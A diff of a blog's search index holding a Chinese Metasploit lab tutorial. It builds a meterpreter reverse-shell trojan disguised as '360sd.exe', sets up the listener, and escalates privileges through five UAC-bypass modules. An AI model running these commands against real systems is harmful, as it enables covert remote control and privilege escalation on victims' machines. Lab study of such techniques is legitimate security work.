@@ -3,7 +3,7 @@
   <entry>
     <title><![CDATA[Metasploit生成木马文件获取shell和UAC提权操作]]></title>
     <url>%2Fmeterpreter-UACgetSystem%2F</url>
-    <content type="text"><![CDATA[前言 攻击环境 获取shell UAC提权 一. 前言前段时间有做过一次内核提权的尝试，不过没有成功，主要还是权限控制的比较严格，并且该打的补丁都打了。但是方法还是有用的，还有就是思路流程总结一下。 二. 攻击环境 攻击机：kali Linux 2019.1 IP：192.168.28.156 靶机：Windows7 ultimate sp1 IP：192.168.28.138 三. 获取shell3.1 生成木马首先启动msf数据库 12/etc/init.d/postgresql startmsfdb init 生成木马 123456msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.156 lport=8585 -f exe -o 360sd.exe-p 选用什么payloadlhost 监听iplport 监听端口-f 生成文件的类型 3.2 启用MSF监听123456use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow options //查看那些参数是需要输入的set lhost 192.168.28.156 //设置监听的IPset lport 8585 //设置监听的端口run/exploit 3.3 投放木马并运行3.4 获取shell 四. UAC提权在获取到shell之后，可以先测试一下命令测试权限 12getsystemgetuid 如果你没有系统/管理员权限，那么你就需要绕过目标系统的UAC保护。 输入background将获取到的会话转入后台，更换其他exp进行提权操作。 4.1 Windows升级UAC保护绕过此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。 123msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit 从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限： 4.2 Windows升级UAC保护绕过（内存注入）此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit 从下图中可以看出，meterpreter 会话2已经成功打开，现在输入getsystem和getuid两条命令来查看权限 4.3 Windows升级UAC保护绕过（FodHelper注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit 4.4 Windows升级UAC保护绕过（Eventvwr注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit 4.5 Windows升级UAC保护绕过（COM Handler劫持绕过）此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。 123msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit]]></content>
+    <content type="text"><![CDATA[前言 攻击环境 获取shell UAC提权 一. 前言前段时间有做过一次内核提权的尝试，不过没有成功，主要还是权限控制的比较严格，并且该打的补丁都打了。但是方法还是有用的，还有就是思路流程总结一下。 二. 攻击环境 攻击机：kali Linux 2019.1 IP：192.168.28.156 靶机：Windows7 ultimate sp1 IP：192.168.28.138 三. 获取shell3.1 生成木马首先启动msf数据库 12/etc/init.d/postgresql startmsfdb init 生成木马 123456msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.156 lport=8585 -f exe -o 360sd.exe-p 选用什么payloadlhost 监听iplport 监听端口-f 生成文件的类型 3.2 启用MSF监听123456use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpshow options //查看那些参数是需要输入的set lhost 192.168.28.156 //设置监听的IPset lport 8585 //设置监听的端口run/exploit 3.3 投放木马并运行3.4 获取shell 四. UAC提权在获取到shell之后，可以先测试一下命令测试权限 12getsystemgetuid 如果你没有系统/管理员权限，那么你就需要绕过目标系统的UAC保护。 输入background将获取到的会话转入后台，更换其他exp进行提权操作。 4.1 Windows升级UAC保护绕过此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。 123msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit 从下图可以看到，又建立了一个meterpreter会话2连接，现在输入getsystem和getuid两条命令来查看系统权限： 4.2 Windows升级UAC保护绕过（内存注入）此模块将通过进程注入利用受信任的发布者证书绕过Windows UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块使用反射DLL注入技术仅删除DLLpayload二进制文件而不是删除标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构（对于SYSWOW64系统也使用x64）。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit 从下图中可以看出，meterpreter 会话2已经成功打开，现在输入getsystem和getuid两条命令来查看权限 4.3 Windows升级UAC保护绕过（FodHelper注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit 4.4 Windows升级UAC保护绕过（Eventvwr注册表键值绕过）此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入自定义命令，这个命令将在启动Windows fodhelper.exe应用程序时调用来绕过Windows 10 UAC。这将产生第二个shell，而且UAC保护已经关闭。此模块修改注册表项，但在调用payload后清除该项。该模块不要求payload的结构与OS匹配。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess()。 123msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit 4.5 Windows升级UAC保护绕过（COM Handler劫持绕过）此模块将通过在HKCU配置单元中创建COM处理程序注册表项来绕过Windows UAC。加载某些高完整性进程时，会引用这些注册表项，从而导致进程加载用户控制的DLL。这些DLL包含导致会话升级的payload。在payload调用后清除注册表项修改。此模块要求payload的体系结构与OS匹配，但当前的低权限Meterpreter会话的体系结构并不相同。如果指定EXE :: Custom，你的DLL应该在单独的进程中启动payload后调用ExitProcess（）。此模块通过目标上的cmd.exe调用目标二进制文件。因此，如果限制cmd.exe访问，则此模块将无法正常运行。 123msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit 参考：利用metasploit绕过UAC的5种方式]]></content>
       <categories>
         <category>攻击测试</category>
       </categories>
@@ -155,8 +155,8 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>SQL注入</tag>
         <tag>环境搭建</tag>
+        <tag>SQL注入</tag>
         <tag>SQLi-Labs</tag>
       </tags>
   </entry>
@@ -236,8 +236,8 @@
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>DVWA</tag>
         <tag>环境搭建</tag>
+        <tag>DVWA</tag>
       </tags>
   </entry>
   <entry>
@@ -288,8 +288,8 @@
         <category>漏洞复现</category>
       </categories>
       <tags>
-        <tag>Metasploit</tag>
         <tag>Nmap</tag>
+        <tag>Metasploit</tag>
         <tag>ms17-010</tag>
         <tag>永恒之蓝</tag>
         <tag>漏洞复现</tag>
